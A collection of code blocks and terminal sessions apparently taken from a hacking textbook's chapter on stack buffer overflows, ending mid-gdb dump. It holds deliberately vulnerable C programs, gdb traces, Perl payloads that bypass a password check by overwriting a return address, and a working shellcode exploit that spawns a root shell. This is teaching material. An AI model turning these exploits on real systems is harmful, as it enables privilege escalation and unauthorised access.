["```\nif (id <: 0 || id > channels_alloc) {\n```", "```\nif (id < 0 || id >= channels_alloc) {\n```", "```\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n   int value = 5;\n   char buffer_one[8], buffer_two[8];\n\n   strcpy(buffer_one, \"one\"); /* Put \"one\" into buffer_one. */\n   strcpy(buffer_two, \"two\"); /* Put \"two\" into buffer_two. */\n\n   printf(\"[BEFORE] buffer_two is at %p and contains \\'%s\\'\\n\", buffer_two, buffer_two);\n   printf(\"[BEFORE] buffer_one is at %p and contains \\'%s\\'\\n\", buffer_one, buffer_one);\n   printf(\"[BEFORE] value is at %p and is %d (0x%08x)\\n\", &value, value, value);\n\n   printf(\"\\n[STRCPY] copying %d bytes into buffer_two\\n\\n\",  strlen(argv[1]));\n   strcpy(buffer_two, argv[1]); /* Copy first argument into buffer_two. */\n\n   printf(\"[AFTER] buffer_two is at %p and contains \\'%s\\'\\n\", buffer_two, buffer_two);\n   printf(\"[AFTER] buffer_one is at %p and contains \\'%s\\'\\n\", buffer_one, buffer_one);\n   printf(\"[AFTER] value is at %p and is %d (0x%08x)\\n\", &value, value, value); \n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o overflow_example overflow_example.c \nreader@hacking:~/booksrc $ ./overflow_example 1234567890\n[BEFORE] buffer_two is at 0xbffff7f0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7f8 and contains 'one'\n[BEFORE] value is at 0xbffff804 and is 5 (0x00000005)\n\n[STRCPY] copying 10 bytes into buffer_two\n\n[AFTER] buffer_two is at 0xbffff7f0 and contains '1234567890'\n[AFTER] buffer_one is at 0xbffff7f8 and contains '90'\n[AFTER] value is at 0xbffff804 and is 5 (0x00000005)\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n\n[STRCPY] copying 29 bytes into buffer_two\n\n[AFTER] buffer_two is at 0xbffff7e0 and contains\n'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAA'\n[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)\nSegmentation fault (core dumped)\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./notesearch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n-------[ end of note data ]-------\nSegmentation fault\nreader@hacking:~/booksrc $\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar shellcode[]=\n\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n\"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n\"\\xe1\\xcd\\x80\";\n\nint main(int argc, char *argv[]) {\n   unsigned int i, *ptr, ret, offset=270;\n   char *command, *buffer;\n\n   command = (char *) malloc(200);\n   bzero(command, 200); // Zero out the new memory.\n\n   strcpy(command, \"./notesearch \\'\"); // Start command buffer.\n   buffer = command + strlen(command); // Set buffer at the end.\n\n   if(argc > 1) // Set offset.\n      offset = atoi(argv[1]);\n\n   ret = (unsigned int) &i - offset; // Set return address.\n\n   for(i=0; i < 160; i+=4) // Fill buffer with return address.\n      *((unsigned int *)(buffer+i)) = ret;\n   memset(buffer, 0x90, 60); // Build NOP sled.\n   memcpy(buffer+60, shellcode, sizeof(shellcode)-1);\n\n   strcat(command, \"\\'\");\n\n   system(command); // Run exploit.\n   free(command);\n}\n```", "```\nreader@hacking:~/booksrc $ gcc exploit_notesearch.c\nreader@hacking:~/booksrc $ ./a.out\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n-------[ end of note data ]-------\nsh-3.2#\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint check_authentication(char *password) {\n   int auth_flag = 0;\n   char password_buffer[16];\n\n   strcpy(password_buffer, password);\n\n   if(strcmp(password_buffer, \"brillig\") == 0)\n      auth_flag = 1;\n   if(strcmp(password_buffer, \"outgrabe\") == 0)\n      auth_flag = 1;\n\n   return auth_flag;\n}\n\nint main(int argc, char *argv[]) {\n   if(argc < 2) {\n      printf(\"Usage: %s <password>\\n\", argv[0]);\n      exit(0);\n   }\n   if(check_authentication(argv[1])) {\n      printf(\"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n      printf(\"      Access Granted.\\n\");\n      printf(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n   } else {\n      printf(\"\\nAccess Denied.\\n\");\n   }\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -g -o auth_overflow auth_overflow.c\nreader@hacking:~/booksrc $ ./auth_overflow\nUsage: ./auth_overflow <password>\nreader@hacking:~/booksrc $ ./auth_overflow test\n\nAccess Denied.\nreader@hacking:~/booksrc $ ./auth_overflow brillig\n\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n      Access Granted.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nreader@hacking:~/booksrc $ ./auth_overflow outgrabe\n\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n      Access Granted.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n      Access Granted.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q ./auth_overflow\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 1\n1       #include <stdio.h>\n2       #include <stdlib.h>\n3       #include <string.h>\n4\n5       int check_authentication(char *password) {\n6               int auth_flag = 0;\n7               char password_buffer[16];\n8\n`9`                strcpy(password_buffer, password);\n10\n(gdb)\n11              if(strcmp(password_buffer, \"brillig\") == 0)\n12                      auth_flag = 1;\n13              if(strcmp(password_buffer, \"outgrabe\") == 0)\n14                      auth_flag = 1;\n15\n`16`              return auth_flag;\n17      }\n18\n19      int main(int argc, char *argv[]) {\n20              if(argc < 2) {\n(gdb) break 9\nBreakpoint 1 at 0x8048421: file auth_overflow.c, line 9.\n(gdb) break 16\nBreakpoint 2 at 0x804846f: file auth_overflow.c, line 16.\n(gdb)\n```", "```\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/reader/booksrc/auth_overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nBreakpoint 1, check_authentication (password=0xbffff9af 'A' <repeats 30 times>) at\nauth_overflow.c:9\n9               strcpy(password_buffer, password);\n(gdb) x/s password_buffer\n0xbffff7a0:      \")????o??????)\\205\\004\\b?o??p???????\"\n(gdb) x/x &auth_flag\n0xbffff7bc:     0x00000000\n(gdb) print 0xbffff7bc - 0xbffff7a0\n$1 = 28\n(gdb) x/16xw password_buffer\n0xbffff7a0:     0xb7f9f729      0xb7fd6ff4      0xbffff7d8      0x08048529\n0xbffff7b0:     0xb7fd6ff4      0xbffff870      0xbffff7d8      0x00000000\n0xbffff7c0:     0xb7ff47b0      0x08048510      0xbffff7d8      0x080484bb\n0xbffff7d0:     0xbffff9af      0x08048510      0xbffff838      0xb7eafebc\n(gdb)\n```", "```\n(gdb) continue\nContinuing.\n\nBreakpoint 2, check_authentication (password=0xbffff9af 'A' <repeats 30 times>) at\nauth_overflow.c:16\n16              return auth_flag;\n(gdb) x/s password_buffer\n0xbffff7a0:      'A' <repeats 30 times>\n(gdb) x/x &auth_flag\n0xbffff7bc:     0x00004141\n(gdb) x/16xw password_buffer\n0xbffff7a0:     0x41414141      0x41414141      0x41414141      0x41414141\n0xbffff7b0:     0x41414141      0x41414141      0x41414141      0x00004141\n0xbffff7c0:     0xb7ff47b0      0x08048510      0xbffff7d8      0x080484bb\n0xbffff7d0:     0xbffff9af      0x08048510      0xbffff838      0xb7eafebc\n(gdb) x/4cb &auth_flag\n0xbffff7bc:     65 'A'  65 'A'  0 '\\0'  0 '\\0'\n(gdb) x/dw &auth_flag\n0xbffff7bc:     16705\n(gdb)\n```", "```\n(gdb) continue\nContinuing.\n\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n      Access Granted.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n\nProgram exited with code 034.\n(gdb)\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint check_authentication(char *password) {\n   `char password_buffer[16];    int auth_flag = 0;`\n\n   strcpy(password_buffer, password);\n\n   if(strcmp(password_buffer, \"brillig\") == 0)\n      auth_flag = 1;\n   if(strcmp(password_buffer, \"outgrabe\") == 0)\n      auth_flag = 1;\n\n   return auth_flag;\n}\n\nint main(int argc, char *argv[]) {\n   if(argc < 2) {\n      printf(\"Usage: %s <password>\\n\", argv[0]);\n      exit(0);\n   }\n   if(check_authentication(argv[1])) {\n      printf(\"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n      printf(\"      Access Granted.\\n\");\n      printf(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n   } else {\n      printf(\"\\nAccess Denied.\\n\");\n   }\n}\n```", "```\nreader@hacking:~/booksrc $ gcc -g auth_overflow2.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 1\n1       #include <stdio.h>\n2       #include <stdlib.h>\n3       #include <string.h>\n4\n5       int check_authentication(char *password) {\n6               char password_buffer[16];\n7               int auth_flag = 0;\n8\n9               strcpy(password_buffer, password);\n10\n(gdb)\n11              if(strcmp(password_buffer, \"brillig\") == 0)\n12                      auth_flag = 1;\n13              if(strcmp(password_buffer, \"outgrabe\") == 0)\n14                      auth_flag = 1;\n15\n16              return auth_flag;\n17      }\n18\n19      int main(int argc, char *argv[]) {\n20              if(argc < 2) {\n(gdb) break 9\nBreakpoint 1 at 0x8048421: file auth_overflow2.c, line 9.\n(gdb) break 16\nBreakpoint 2 at 0x804846f: file auth_overflow2.c, line 16.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nBreakpoint 1, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>) at\nauth_overflow2.c:9\n9               strcpy(password_buffer, password);\n(gdb) x/s password_buffer\n0xbffff7c0:      \"?o??\\200????????o???G??\\020\\205\\004\\b?????\\204\\004\\b????\\020\\205\\004\\\nbH???????\\002\"\n(gdb) x/x &auth_flag\n0xbffff7bc:     0x00000000\n(gdb) x/16xw &auth_flag\n0xbffff7bc:     `0x00000000`      0xb7fd6ff4      0xbffff880      0xbffff7e8\n0xbffff7cc:     0xb7fd6ff4      0xb7ff47b0      0x08048510      0xbffff7e8\n0xbffff7dc:     0x080484bb      0xbffff9b7      0x08048510      0xbffff848\n0xbffff7ec:     0xb7eafebc      0x00000002      0xbffff874      0xbffff880 \n(gdb)\n```", "```\n(gdb) cont\nContinuing.\n\nBreakpoint 2, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>)\n    at auth_overflow2.c:16\n16              return auth_flag;\n(gdb) x/s password_buffer\n0xbffff7c0:      'A' <repeats 30 times>\n(gdb) x/x &auth_flag\n0xbffff7bc:     0x00000000\n(gdb) x/16xw &auth_flag\n0xbffff7bc:     `0x00000000`      0x41414141      0x41414141      0x41414141\n0xbffff7cc:     0x41414141      0x41414141      0x41414141      0x41414141\n0xbffff7dc:     0x08004141      0xbffff9b7      0x08048510      0xbffff848\n0xbffff7ec:     0xb7eafebc      0x00000002      0xbffff874      0xbffff880 \n(gdb)\n```", "```\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x08004141 in ?? ()\n(gdb)\n```", "```\nreader@hacking:~/booksrc $ gcc -g auth_overflow2.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 1\n1       #include <stdio.h>\n2       #include <stdlib.h>\n3       #include <string.h>\n4\n5       int check_authentication(char *password) {\n6               char password_buffer[16];\n7               int auth_flag = 0;\n8\n9               strcpy(password_buffer, password);\n10\n(gdb)\n11              if(strcmp(password_buffer, \"brillig\") == 0)\n12                      auth_flag = 1;\n13              if(strcmp(password_buffer, \"outgrabe\") == 0)\n14                      auth_flag = 1;\n15\n16              return auth_flag;\n17      }\n18\n19      int main(int argc, char *argv[]) {\n20              if(argc < 2) {\n(gdb)\n21                      printf(\"Usage: %s <password>\\n\", argv[0]);\n22                      exit(0);\n23              }\n24              if(check_authentication(argv[1])) {\n25                      printf(\"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n26                      printf(\"      Access Granted.\\n\");\n27                      printf(\"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\");\n28              } else {\n29                      printf(\"\\nAccess Denied.\\n\");\n30         }\n(gdb) break 24\nBreakpoint 1 at 0x80484ab: file auth_overflow2.c, line 24.\n(gdb) break 9\nBreakpoint 2 at 0x8048421: file auth_overflow2.c, line 9.\n(gdb) break 16\nBreakpoint 3 at 0x804846f: file auth_overflow2.c, line 16.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/reader/booksrc/a.out AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nBreakpoint 1, main (argc=2, argv=0xbffff874) at auth_overflow2.c:24\n24              if(check_authentication(argv[1])) {\n(gdb) i r esp\nesp            0xbffff7e0       0xbffff7e0\n(gdb) x/32xw $esp\n0xbffff7e0:     0xb8000ce0      0x08048510      0xbffff848      0xb7eafebc\n0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898\n0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000\n0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848\n0xbffff820:     0x40f5f7f0      0x48e0fe81      0x00000000      0x00000000\n0xbffff830:     0x00000000      0xb7ff9300      0xb7eafded      0xb8000ff4\n0xbffff840:     0x00000002      0x08048350      0x00000000      0x08048371\n0xbffff850:     0x08048474      0x00000002      0xbffff874      0x08048510 \n(gdb)\n```", "```\n(gdb) c\nContinuing.\n\nBreakpoint 2, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>) at\nauth_overflow2.c:9\n9               strcpy(password_buffer, password);\n(gdb) i r esp\nesp            0xbffff7a0       0xbffff7a0\n(gdb) x/32xw $esp\n0xbffff7a0:     0x00000000      `0x08049744      0xbffff7b8      0x080482d9`\n0xbffff7b0:     `0xb7f9f729      0xb7fd6ff4      0xbffff7e8`    0x00000000\n0xbffff7c0:     `0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4`\n0xbffff7d0:     `0xb7ff47b0      0x08048510      0xbffff7e8      0x080484bb`\n0xbffff7e0:     `0xbffff9b7`      0x08048510      0xbffff848      0xb7eafebc\n0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898\n0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000\n0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848\n(gdb) p 0xbffff7e0 - 0xbffff7a0\n$1 = 64\n(gdb) x/s password_buffer\n0xbffff7c0:      \"?o??\\200????????o???G??\\020\\205\\004\\b?????\\204\\004\\b????\\020\\205\\004\\\nbH???????\\002\"\n(gdb) x/x &auth_flag\n0xbffff7bc:     0x00000000\n(gdb)\n```", "```\n(gdb) x/32xw $esp\n0xbffff7a0:     0x00000000      `0x08049744      0xbffff7b8      0x080482d9`\n0xbffff7b0:     `0xb7f9f729      0xb7fd6ff4      0xbffff7e8`      *`0x00000000`*\n0xbffff7c0:     *`0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4`*\n0xbffff7d0:     `0xb7ff47b0      0x08048510      0xbffff7e8     ![](httpatomoreillycomsourcenostarchimages254537.png)0x080484bb`\n0xbffff7e0:     0xbffff9b7      0x08048510      0xbffff848      0xb7eafebc\n0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898\n0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000\n0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848\n(gdb) x/32xb 0xbffff9b7\n0xbffff9b7:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xbffff9bf:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xbffff9c7:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41\n0xbffff9cf:     0x41    0x41    0x41    0x41    0x41    0x41    0x00    0x53\n(gdb) x/s 0xbffff9b7\n0xbffff9b7:      'A' <repeats 30 times> \n(gdb)\n```", "```\n(gdb) disass main\nDump of assembler code for function main:\n0x08048474 <main+0>:    push   ebp\n0x08048475 <main+1>:    mov    ebp,esp\n0x08048477 <main+3>:    sub    esp,0x8\n0x0804847a <main+6>:    and    esp,0xfffffff0\n0x0804847d <main+9>:    mov    eax,0x0\n0x08048482 <main+14>:   sub    esp,eax\n0x08048484 <main+16>:   cmp    DWORD PTR [ebp+8],0x1\n0x08048488 <main+20>:   jg     0x80484ab <main+55>\n0x0804848a <main+22>:   mov    eax,DWORD PTR [ebp+12]\n0x0804848d <main+25>:   mov    eax,DWORD PTR [eax]\n0x0804848f <main+27>:   mov    DWORD PTR [esp+4],eax\n0x08048493 <main+31>:   mov    DWORD PTR [esp],0x80485e5\n0x0804849a <main+38>:   call   0x804831c <printf@plt>\n0x0804849f <main+43>:   mov    DWORD PTR [esp],0x0\n0x080484a6 <main+50>:   call   0x804833c <exit@plt>\n0x080484ab <main+55>:   mov    eax,DWORD PTR [ebp+12]\n0x080484ae <main+58>:   add    eax,0x4\n0x080484b1 <main+61>:   mov    eax,DWORD PTR [eax]\n`0x080484b3 <main+63>:   mov    DWORD PTR [esp],eax 0x080484b6 <main+66>:   call   0x8048414 <check_authentication>`\n0x080484bb <main+71>:   test   eax,eax\n0x080484bd <main+73>:   je     0x80484e5 <main+113>\n0x080484bf <main+75>:   mov    DWORD PTR [esp],0x80485fb\n0x080484c6 <main+82>:   call   0x804831c <printf@plt>\n0x080484cb <main+87>:   mov    DWORD PTR [esp],0x8048619\n0x080484d2 <main+94>:   call   0x804831c <printf@plt>\n0x080484d7 <main+99>:   mov    DWORD PTR [esp],0x8048630\n0x080484de <main+106>:  call   0x804831c <printf@plt>\n0x080484e3 <main+111>:  jmp    0x80484f1 <main+125>\n0x080484e5 <main+113>:  mov    DWORD PTR [esp],0x804864d\n0x080484ec <main+120>:  call   0x804831c <printf@plt>\n0x080484f1 <main+125>:  leave\n0x080484f2 <main+126>:  ret\nEnd of assembler dump.\n(gdb)\n```", "```\n(gdb) disass check_authentication\nDump of assembler code for function check_authentication:\n`0x08048414 <check_authentication+0>:    push   ebp 0x08048415 <check_authentication+1>:    mov    ebp,esp 0x08048417 <check_authentication+3>:    sub    esp,0x38`\n\n...\n\n0x08048472 <check_authentication+94>:   leave\n0x08048473 <check_authentication+95>:   ret\nEnd of assembler dump.\n(gdb) p 0x38\n$3 = 56\n(gdb) p 0x38 + 4 + 4\n$4 = 64\n(gdb)\n```", "```\n(gdb) x/32xw $esp\n0xbffff7a0:     0x00000000      `0x08049744      0xbffff7b8      0x080482d9`\n0xbffff7b0:     `0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000`\n0xbffff7c0:     `0xb7fd6ff4      0xbffff880      0xbffff7e8      0xb7fd6ff4`\n0xbffff7d0:     `0xb7ff47b0      0x08048510      0xbffff7e8   ![](httpatomoreillycomsourcenostarchimages254488.png)0x080484bb`\n0xbffff7e0:     `0xbffff9b7`      0x08048510      0xbffff848      0xb7eafebc\n0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898\n0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000\n0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848\n(gdb) cont\nContinuing.\n\nBreakpoint 3, check_authentication (password=0xbffff9b7 'A' <repeats 30 times>)\n    at auth_overflow2.c:16\n16              return auth_flag;\n(gdb) x/32xw $esp\n0xbffff7a0:     `0xbffff7c0      0x080485dc      0xbffff7b8      0x080482d9`\n0xbffff7b0:     `0xb7f9f729      0xb7fd6ff4      0xbffff7e8      0x00000000`\n0xbffff7c0:     `0x41414141      0x41414141      0x41414141      0x41414141`\n0xbffff7d0:     `0x41414141      0x41414141      0x41414141   ![](httpatomoreillycomsourcenostarchimages254530.png)0x08004141`\n0xbffff7e0:     `0xbffff9b7`      0x08048510      0xbffff848      0xb7eafebc\n0xbffff7f0:     0x00000002      0xbffff874      0xbffff880      0xb8001898\n0xbffff800:     0x00000000      0x00000001      0x00000001      0x00000000\n0xbffff810:     0xb7fd6ff4      0xb8000ce0      0x00000000      0xbffff848\n(gdb) cont\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x08004141 in ?? ()\n(gdb)\n```", "```\nreader@hacking:~/booksrc $ perl -e 'print \"A\" x 20;'\nAAAAAAAAAAAAAAAAAAAA\n```", "```\nreader@hacking:~/booksrc $ perl -e 'print \"\\x41\" x 20;'\nAAAAAAAAAAAAAAAAAAAA\n```", "```\nreader@hacking:~/booksrc $ perl -e 'print \"A\"x20 . \"BCD\" . \"\\x61\\x66\\x67\\x69\"x2 . \"Z\";'\nAAAAAAAAAAAAAAAAAAAABCDafgiafgiZ\n```", "```\nreader@hacking:~/booksrc $ $(perl -e 'print \"uname\";')\nLinux\nreader@hacking:~/booksrc $ una$(perl -e 'print \"m\";')e\nLinux\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ u`perl -e 'print \"na\";'`me\nLinux\nreader@hacking:~/booksrc $ u$(perl -e 'print \"na\";')me\nLinux\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print \"A\"x30')\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n\n[STRCPY] copying 30 bytes into buffer_two\n\n[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAAA'\n[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)\nSegmentation fault (core dumped)\nreader@hacking:~/booksrc $ gdb -q\n(gdb) print 0xbffff7f4 - 0xbffff7e0\n$1 = 20\n\n(gdb) quit\nreader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print \"A\"x20 . \"ABCD\"')\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n\n[STRCPY] copying 24 bytes into buffer_two\n\n[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAAABCD'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAABCD'\n[AFTER] value is at 0xbffff7f4 and is 1145258561 (0x44434241) \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./overflow_example $(perl -e 'print \"A\"x20 .\n \"\\xef\\xbe\\xad\\xde\"')\n[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'\n[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'\n[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)\n\n[STRCPY] copying 24 bytes into buffer_two\n\n[AFTER] buffer_two is at 0xbffff7e0 and contains 'AAAAAAAAAAAAAAAAAAAA??'\n[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAA??'\n[AFTER] value is at 0xbffff7f4 and is -559038737 (0xdeadbeef)\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gcc -g -o auth_overflow2 auth_overflow2.c \nreader@hacking:~/booksrc $ gdb -q ./auth_overflow2\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass main\nDump of assembler code for function main:\n0x08048474 <main+0>:    push   ebp\n0x08048475 <main+1>:    mov    ebp,esp\n0x08048477 <main+3>:    sub    esp,0x8\n0x0804847a <main+6>:    and    esp,0xfffffff0\n0x0804847d <main+9>:    mov    eax,0x0\n0x08048482 <main+14>:   sub    esp,eax\n0x08048484 <main+16>:   cmp    DWORD PTR [ebp+8],0x1\n0x08048488 <main+20>:   jg     0x80484ab <main+55>\n0x0804848a <main+22>:   mov    eax,DWORD PTR [ebp+12]\n0x0804848d <main+25>:   mov    eax,DWORD PTR [eax]\n0x0804848f <main+27>:   mov    DWORD PTR [esp+4],eax\n0x08048493 <main+31>:   mov    DWORD PTR [esp],0x80485e5\n0x0804849a <main+38>:   call   0x804831c <printf@plt>\n0x0804849f <main+43>:   mov    DWORD PTR [esp],0x0\n0x080484a6 <main+50>:   call   0x804833c <exit@plt>\n0x080484ab <main+55>:   mov    eax,DWORD PTR [ebp+12]\n0x080484ae <main+58>:   add    eax,0x4\n0x080484b1 <main+61>:   mov    eax,DWORD PTR [eax]\n0x080484b3 <main+63>:   mov    DWORD PTR [esp],eax\n0x080484b6 <main+66>:   call   0x8048414 <check_authentication>\n0x080484bb <main+71>:   test   eax,eax\n0x080484bd <main+73>:   je     0x80484e5 <main+113>\n`0x080484bf <main+75>:   mov    DWORD PTR [esp],0x80485fb 0x080484c6 <main+82>:   call   0x804831c <printf@plt> 0x080484cb <main+87>:   mov    DWORD PTR [esp],0x8048619 0x080484d2 <main+94>:   call   0x804831c <printf@plt> 0x080484d7 <main+99>:   mov    DWORD PTR [esp],0x8048630 0x080484de <main+106>:  call   0x804831c <printf@plt>`\n0x080484e3 <main+111>:  jmp    0x80484f1 <main+125>\n0x080484e5 <main+113>:  mov    DWORD PTR [esp],0x804864d\n0x080484ec <main+120>:  call   0x804831c <printf@plt>\n0x080484f1 <main+125>:  leave\n0x080484f2 <main+126>:  ret\nEnd of assembler dump.\n(gdb)\n```", "```\nreader@hacking:~/booksrc $ ./auth_overflow2 $(perl -e 'print \"\\xbf\\x84\\x04\\x08\"x10')\n\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\n      Access Granted.\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\nSegmentation fault (core dumped)\nreader@hacking:~/booksrc $\n```", "```\nint main(int argc, char *argv[]) {\n   int userid, printing=1, fd; // File descriptor\n   char searchstring[100];\n\n   if(argc > 1)                        // If there is an arg\n      `strcpy(searchstring, argv[1]);`   //   that is the search string;\n   else                                // otherwise,\n      searchstring[0] = 0;             //   search string is empty.\n```", "```\nreader@hacking:~/booksrc $ gcc -g exploit_notesearch.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) list 1\n1       #include <stdio.h>\n2       #include <stdlib.h>\n3       #include <string.h>\n4       char shellcode[]=\n5       \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\xb0\\xa4\\xcd\\x80\\x6a\\x0b\\x58\\x51\\x68\"\n6       \"\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x51\\x89\\xe2\\x53\\x89\"\n7       \"\\xe1\\xcd\\x80\";\n8\n9       int main(int argc, char *argv[]) {\n10         unsigned int i, *ptr, ret, offset=270;\n(gdb)\n11         char *command, *buffer;\n12\n13         command = (char *) malloc(200);\n14         bzero(command, 200); // Zero out the new memory.\n15\n16         strcpy(command, \"./notesearch \\'\"); // Start command buffer.\n17         buffer = command + strlen(command); // Set buffer at the end.\n18\n19         if(argc > 1) // Set offset.\n20            offset = a toi(argv[1]);\n(gdb)\n21\n22         ret = (unsigned int) &i - offset; // Set return address.\n23\n`24         for(i=0; i < 160; i+=4)` // Fill buffer with return address.\n`25            *((unsigned int *)(buffer+i)) = ret; 26         memset(buffer, 0x90, 60);`  // Build NOP sled.\n`27         memcpy(buffer+60, shellcode, sizeof(shellcode)-1);`\n28\n29         strcat(command, \"\\'\");\n30\n(gdb) break 26\nBreakpoint 1 at 0x80485fa: file exploit_notesearch.c, line 26.\n(gdb) break 27\nBreakpoint 2 at 0x8048615: file exploit_notesearch.c, line 27.\n(gdb) break 28\nBreakpoint 3 at 0x8048633: file exploit_notesearch.c, line 28.\n(gdb)\n```", "```\n(gdb) run\nStarting program: /home/reader/booksrc/a.out\n\nBreakpoint 1, main (argc=1, argv=0xbffff894) at exploit_notesearch.c:26\n26         memset(buffer, 0x90, 60); // build NOP sled\n(gdb) x/40x buffer\n0x804a016:      0xbffff6f6      0xbffff6f6      0xbffff6f6      0xbffff6f6\n0x804a026:      